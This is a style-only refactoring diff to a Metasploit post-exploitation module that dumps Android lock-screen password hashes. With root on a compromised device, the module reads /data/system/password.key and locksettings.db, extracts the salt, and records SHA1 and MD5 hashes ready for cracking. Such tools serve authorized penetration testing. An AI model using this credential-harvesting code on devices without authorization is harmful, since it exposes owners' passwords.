@@ -11,26 +11,30 @@ class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Android::Priv
 
-  def initialize(info={})
-    super( update_info( info, {
-        'Name'          => "Android Gather Dump Password Hashes for Android Systems",
-        'Description'   => %q{
-           Post Module to dump the password hashes for Android System. Root is required.
-           To perform this operation, two things are needed.  First, a password.key file
-           is required as this contains the hash but no salt.  Next, a sqlite3 database
-           is needed (with supporting files) to pull the salt from.  Combined, this
-           creates the hash we need.  Samsung based devices change the hash slightly.
-        },
-        'License'       => MSF_LICENSE,
-        'Author'        => ['h00die', 'timwr'],
-        'SessionTypes'  => [ 'meterpreter', 'shell' ],
-        'Platform'      => 'android',
-        'References'    => [
-          ['URL', 'https://www.pentestpartners.com/security-blog/cracking-android-passwords-a-how-to/'],
-          ['URL', 'https://hashcat.net/forum/thread-2202.html'],
-        ],
-      }
-    ))
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        {
+          'Name' => 'Android Gather Dump Password Hashes for Android Systems',
+          'Description' => %q{
+            Post Module to dump the password hashes for Android System. Root is required.
+            To perform this operation, two things are needed.  First, a password.key file
+            is required as this contains the hash but no salt.  Next, a sqlite3 database
+            is needed (with supporting files) to pull the salt from.  Combined, this
+            creates the hash we need.  Samsung based devices change the hash slightly.
+          },
+          'License' => MSF_LICENSE,
+          'Author' => ['h00die', 'timwr'],
+          'SessionTypes' => [ 'meterpreter', 'shell' ],
+          'Platform' => 'android',
+          'References' => [
+            ['URL', 'https://www.pentestpartners.com/security-blog/cracking-android-passwords-a-how-to/'],
+            ['URL', 'https://hashcat.net/forum/thread-2202.html'],
+          ]
+        }
+      )
+    )
   end
 
   def read_store_sql(location)
@@ -43,6 +47,7 @@ class MetasploitModule < Msf::Post
       unless file_exist?(l)
         next
       end
+
       f = file_name + ext
       data = read_file(l)
       if data.blank?
@@ -73,7 +78,7 @@ class MetasploitModule < Msf::Post
       fail_with Failure::NoAccess, 'This module requires root permissions.'
     end
 
-    manu = cmd_exec("getprop ro.product.manufacturer")
+    manu = cmd_exec('getprop ro.product.manufacturer')
 
     print_status('Attempting to determine unsalted hash.')
     key_file = '/data/system/password.key'
@@ -91,7 +96,7 @@ class MetasploitModule < Msf::Post
     print_good('Saved password.key')
 
     print_status('Attempting to determine salt')
-    os = cmd_exec("getprop ro.build.version.release")
+    os = cmd_exec('getprop ro.build.version.release')
     vprint_status("OS Version: #{os}")
 
     locksettings_db = '/data/system/locksettings.db'
@@ -127,15 +132,15 @@ class MetasploitModule < Msf::Post
     sha1 = "#{sha1}:#{salt}"
     print_good("SHA1: #{sha1}")
     credential_data = {
-        # no way to tell them apart w/o knowing one is samsung or not.
-        jtr_format: manu =~ /samsung/i ? 'android-samsung-sha1' : 'android-sha1',
-        origin_type: :session,
-        post_reference_name: self.refname,
-        private_type: :nonreplayable_hash,
-        private_data: sha1,
-        session_id: session_db_id,
-        username: '',
-        workspace_id: myworkspace_id
+      # no way to tell them apart w/o knowing one is samsung or not.
+      jtr_format: manu =~ /samsung/i ? 'android-samsung-sha1' : 'android-sha1',
+      origin_type: :session,
+      post_reference_name: refname,
+      private_type: :nonreplayable_hash,
+      private_data: sha1,
+      session_id: session_db_id,
+      username: '',
+      workspace_id: myworkspace_id
     }
     create_credential(credential_data)
 
@@ -144,14 +149,14 @@ class MetasploitModule < Msf::Post
       md5 = "#{md5}:#{salt}"
       print_good("MD5: #{md5}")
       credential_data = {
-          jtr_format: Metasploit::Framework::Hashes.identify_hash(md5),
-          origin_type: :session,
-          post_reference_name: self.refname,
-          private_type: :nonreplayable_hash,
-          private_data: md5,
-          session_id: session_db_id,
-          username: '',
-          workspace_id: myworkspace_id
+        jtr_format: Metasploit::Framework::Hashes.identify_hash(md5),
+        origin_type: :session,
+        post_reference_name: refname,
+        private_type: :nonreplayable_hash,
+        private_data: md5,
+        session_id: session_db_id,
+        username: '',
+        workspace_id: myworkspace_id
       }
       create_credential(credential_data)
     end
